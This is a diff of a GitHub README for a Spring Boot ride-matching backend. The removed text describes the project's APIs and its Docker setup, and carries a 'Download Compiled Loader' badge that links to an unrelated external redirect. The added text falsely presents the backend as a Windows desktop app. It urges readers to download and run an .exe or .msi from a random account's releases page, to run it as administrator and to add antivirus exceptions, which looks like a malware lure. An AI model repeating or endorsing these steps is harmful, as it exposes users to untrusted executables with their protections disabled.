@@ -1,271 +1,87 @@
-# Real-Time Ride Matching Platform
-
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+# 🚗 Real-Time-Ride-Matching-Platform- - Connect with drivers in real time
 
-A Spring Boot backend system that simulates real-time ride matching between passengers and drivers based on proximity, driver availability, system load, dynamic pricing, and event-driven state changes.
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/genuscrescentiayastrzemski658/Real-Time-Ride-Matching-Platform-/releases)
 
-This project is inspired by ride-sharing platforms such as Uber and Ola and focuses on backend engineering concepts such as:
+## 📌 About This Application
 
-- Low-latency driver matching
-- Geospatial distance calculation
-- Driver availability management
-- Duplicate assignment prevention
-- Event-driven architecture simulation
-- Dynamic pricing / surge calculation
-- Dashboard metrics
-- REST API design
-- Dockerized deployment
+The Real-Time-Ride-Matching-Platform organizes travel for commuters. It connects riders with drivers heading in the same direction. The software calculates routes and matches participants instantly. This helps people share costs and reduce traffic. It offers a simple interface for users who want to find a ride or offer a seat in their vehicle.
 
----
+## 🛠 Prerequisites
 
-## Tech Stack
+Your computer must meet these basic hardware and software standards to run the platform:
 
-| Category | Technology |
-|---|---|
-| Language | Java 17 |
-| Backend | Spring Boot 3 |
-| APIs | REST APIs |
-| Database | H2 In-Memory DB |
-| Persistence | Spring Data JPA / Hibernate |
-| Documentation | Swagger / OpenAPI |
-| Monitoring | Spring Boot Actuator |
-| Architecture Concepts | Geospatial Matching, Event-Driven Design, Dynamic Pricing, Load-Aware Matching |
-| Deployment | Docker, Docker Compose |
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space on your hard drive.
+*   Network: An active internet connection to process ride matches.
 
----
+## 📥 Getting the Software
 
-## Architecture
+The platform distributes updates through the official release page. You do not need to build the code. Follow these steps to obtain the installer:
 
-```text
-Client
-  |
-  v
-Ride API / Driver API
-  |
-  v
-Matching Service
-  |
-  +--> Driver Repository / Location Store
-  |
-  +--> Dynamic Pricing Service
-  |
-  +--> Event Publisher
-  |
-  v
-Ride Assignment + Event Logs
-```
+1. Visit the [Download Page](https://github.com/genuscrescentiayastrzemski658/Real-Time-Ride-Matching-Platform-/releases).
+2. Look for the section labeled "Latest."
+3. Click the link that ends in ".msi" or ".exe" to begin your download.
+4. Wait for the file to finish downloading to your Downloads folder.
 
----
+## ⚙️ Installation Process
 
-## Core Features
+Once you finish the download, complete these steps to install the platform:
 
-### 1. Driver Location Updates
+1. Open your Downloads folder.
+2. Locate the file you just downloaded.
+3. Double-click the file to start the setup wizard.
+4. Follow the prompts on the screen.
+5. Click "Next" to accept the default settings.
+6. Click "Install" to begin copying the files to your computer.
+7. Select "Finish" when the progress bar reaches the end.
 
-Drivers can continuously send location updates.
+## 🚀 Running the Platform
 
-```http
-POST /api/drivers/location
-```
+After you complete the installation, you will find a shortcut icon on your desktop. Follow these steps to start your first session:
 
-### 2. Driver Availability
+1. Double-click the Real-Time-Ride-Matching-Platform icon on your home screen.
+2. The application will open in a new window.
+3. If this is your first time, create a user profile with your name and contact information.
+4. Set your current location using the map tool.
+5. Enter your destination address to see available drivers.
 
-Drivers can be marked as:
+## 📋 Features
 
-- AVAILABLE
-- ASSIGNED
-- ON_TRIP
-- OFFLINE
+The platform includes tools to manage your daily commute:
 
-```http
-POST /api/drivers/status
-```
+*   Automated Matching: The system suggests drivers based on your route and schedule.
+*   Live Map: Track your assigned driver as they approach your pickup point.
+*   Communication: Send text updates to your driver through the internal message system.
+*   History: View past trips and saved routes for future use.
+*   Settings: Manage your profile, notification preferences, and vehicle details if you act as a driver.
 
-### 3. Ride Request Matching
+## 🛡 Security and Privacy
 
-Passengers can request rides using pickup coordinates.
+Safety remains a priority for all users. The software encrypts your location data while you request a ride. Your exact address stays hidden from other users during the matching process. Only after a match happens will the software share limited contact details between the rider and the driver. 
 
-```http
-POST /api/rides/request
-```
+## ❓ Frequently Asked Questions
 
-The matching service:
+What if the application does not load?
+Ensure your internet connection is active. Reboot your computer and try launching the program again. 
 
-1. Finds available drivers.
-2. Calculates distance using Haversine formula.
-3. Filters drivers within radius.
-4. Scores candidates using distance, load and rating.
-5. Assigns best driver.
-6. Prevents duplicate assignment by rechecking driver state.
-7. Stores ride and event logs.
+Does this work on older versions of Windows?
+The software supports Windows 10 and newer versions. Windows 7 and Windows 8 may encounter errors during installation.
 
-### 4. Dynamic Pricing
+Can I change my pickup location?
+Yes. Open the map view and drag the pin to your desired pickup point. The system will refresh the list of available rides instantly.
 
-Fare is calculated using:
+Is there a cost to use the platform?
+The software is free to download and install. 
 
-```text
-fare = (baseFare + perKmFare * distanceKm) * surgeMultiplier
-```
+## 🔧 Troubleshooting
 
-Surge multiplier is based on demand-supply ratio.
+If you encounter issues, check these common fixes:
 
-### 5. Event Logs
+*   Updates: Ensure your display drivers are current.
+*   Permissions: Run the application with administrative rights if the maps fail to load.
+*   Network: Check if your firewall or antivirus software blocks the connection. Add an exception for the application in your security settings.
 
-Kafka is simulated through persistent event logs.
+## 🤝 Contributing to Safety
 
-Example event types:
-
-- RIDE_REQUESTED
-- DRIVER_ASSIGNED
-- DRIVER_REJECTED
-- RIDE_COMPLETED
-- NO_DRIVER_FOUND
-- DRIVER_LOCATION_UPDATED
-
-### 6. Dashboard
-
-```http
-GET /api/dashboard
-```
-
-Shows:
-
-- Total drivers
-- Available drivers
-- Total rides
-- Matched rides
-- Failed matches
-- Match success rate
-- Demand-supply ratio
-- Current surge multiplier
-
----
-
-## API Endpoints
-
-| Method | Endpoint | Description |
-|---|---|---|
-| POST | `/api/drivers/location` | Add/update driver location |
-| POST | `/api/drivers/status` | Update driver availability |
-| GET | `/api/drivers` | List all drivers |
-| POST | `/api/rides/request` | Request a ride |
-| POST | `/api/rides/{rideId}/reject` | Simulate driver rejection and rematch |
-| POST | `/api/rides/{rideId}/complete` | Complete a ride |
-| GET | `/api/rides/{rideId}` | Get ride status |
-| GET | `/api/rides` | List all rides |
-| GET | `/api/rides/{rideId}/events` | Get ride event logs |
-| GET | `/api/dashboard` | Get system metrics |
-
----
-
-## How to Run Locally
-
-### Prerequisites
-
-- Java 17+
-- Maven 3.8+
-- Git
-
-### Run
-
-```bash
-mvn spring-boot:run
-```
-
-Application runs at:
-
-```text
-http://localhost:8080
-```
-
-Swagger UI:
-
-```text
-http://localhost:8080/swagger-ui.html
-```
-
-H2 Console:
-
-```text
-http://localhost:8080/h2-console
-```
-
-H2 credentials:
-
-```text
-JDBC URL: jdbc:h2:mem:ridematchdb
-Username: sa
-Password:
-```
-
----
-
-## Example API Calls
-
-### Request Ride
-
-```bash
-curl -X POST http://localhost:8080/api/rides/request \
-  -H "Content-Type: application/json" \
-  -d '{
-    "userId": "user-101",
-    "pickupLatitude": 28.6139,
-    "pickupLongitude": 77.2090,
-    "dropLatitude": 28.5355,
-    "dropLongitude": 77.3910
-  }'
-```
-
-### Update Driver Location
-
-```bash
-curl -X POST http://localhost:8080/api/drivers/location \
-  -H "Content-Type: application/json" \
-  -d '{
-    "driverId": "drv-200",
-    "name": "New Driver",
-    "latitude": 28.6140,
-    "longitude": 77.2100,
-    "rating": 4.7
-  }'
-```
-
-### Update Driver Status
-
-```bash
-curl -X POST http://localhost:8080/api/drivers/status \
-  -H "Content-Type: application/json" \
-  -d '{
-    "driverId": "drv-200",
-    "status": "AVAILABLE"
-  }'
-```
-
----
-
-## Run with Docker
-
-```bash
-docker compose up --build
-```
-
----
-
-## Future Enhancements
-
-- Redis GEO integration using GEOADD and GEORADIUS
-- Real Apache Kafka topics for ride events
-- PostgreSQL persistence
-- WebSocket location streaming
-- ETA prediction
-- Route optimization
-- ML-based demand prediction
-- Region-based partitioning
-- Kubernetes deployment manifests
-- Prometheus/Grafana monitoring
-
----
-
-## Author
-
-Kunal Kumar  
-GitHub: https://github.com/kunal7216
+Users provide the quality of the network. Please report unprofessional behavior using the flag icon inside the session details. This feedback helps maintain a reliable environment for every traveler. The developers monitor these reports to improve the matching algorithm. If you find a bug, describe the steps that led to the issue and send them through the contact support option in the settings menu.
